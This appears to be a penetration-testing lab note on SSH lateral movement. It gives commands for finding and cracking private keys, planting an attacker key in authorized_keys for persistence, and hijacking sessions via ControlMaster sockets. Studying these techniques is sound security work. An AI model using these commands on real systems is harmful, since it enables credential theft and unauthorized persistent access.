## Lateral Movement with SSH

Some systems permit password authentication to connect to a Linux machine via SSH, many require public key authentication. The public key is stored in the ~/.ssh/authorized_keys 
file of the server the user is connecting to. The private key is typically stored in the ~/.ssh/ directory on the system the user is connecting from.

Private SSH keys are a prime target for an attacker. We can search for it
 
```
find /home/ -name "id_rsa"
```
Once we located the private key file, we need to check if the key is protected with a passphrase by reading the key file
The Proc-Type: 4,ENCRYPTED tell us the key is encrypted with password passphrase.
```
root@linuxvictim:/home/linuxvictim# cat svuser.key
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,351CBB3ECC54B554DD07029E2C377380
```

we can recon user’s ~/.ssh/known_hosts file to find machines that have been connected to recently or check the bash history

```
root@linuxvictim:/home/linuxvictim/.ssh# cat known_hosts
root@linuxvictim:/home/linuxvictim# tail .bash_history
```
Lastly we need to Convert private key to john readable format form ssh2john.py and crack the passphase for the private key using John


```
kali@kali:~$ python /usr/share/john/ssh2john.py svuser.key > svuser.hash
kali@kali:~$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt ./svuser.hash
```
#### ssh persistence

We can insert our public key into a user's ~/.ssh/authorized_keys file. allowing us to access the machine again
via SSH later on.

Set up keypair on attack vm. The id_rsa for the private key and id_rsa.pub for the public key. We can then cat the
contents of id_rsa.pub and copy it to the clipboard. 
```
kali@kali:~# ssh-keygen
```

On the linuxvictim machine, we can insert the public key into the linuxvictim user’s
authorized_keys file with the following command.

```
linuxvictim@linuxvictim:~$ echo "ssh-rsa AAAAB3NzaC1yc2E....ANSzp9EPhk4cIeX8=
kali@kali" >> /home/linuxvictim/.ssh/authorized_keys
```
Now we can then ssh from our Kali VM using our private key to the linuxvictim machine and log in as
the linuxvictim user without a password

```
kali@kali:~$ ssh -i /id_rsa linuxvictim@linuxvictim
```

#### ssh hijacking with controlmaster
The term SSH hijacking refers to the use of an existing SSH connection to gain access to another machine. ControlMaster is a feature that enables sharing of multiple SSH sessions over a single network connection.

1.We’ll start by logging in to our Linux controller machine as the offsec user, and create the
**~/.ssh/config** file, with the following content:
 
```
Host *
      ControlPath ~/.ssh/controlmaster/%r@%h:%p
      ControlMaster auto
      ControlPersist 10m
```

- ->~/.ssh/controlmaster/ with the name <remoteusername@<targethost>:<port>.
- ControlMaster line identifies that any new connections will attempt to use existing ControlMaster sockets when possible.
- ControlPersist can either be set to “yes” or to a specified time. If it is set to “yes”, the socket stays open indefinitely.
 
 2. We will create the ~/.ssh/controlmaster/ directory and  set the correct permission on the ssh configuration file
 ```
 offsec@controller:~$ chmod 644 ~/.ssh/config
 offsec@controller:~$ mkdir ~/.ssh/controlmaster
 ```
 3.Now the users on controller ssh into another remote host, we can piggyback the connection with the controlmaster.
 ```
 offsec@controller:~$ ssh offsec@linuxvictim
 
 root@controller:~# ssh -S /home/offsec/.ssh/controlmaster/offsec\@linuxvictim\:22 offsec@linuxvictim
 ```
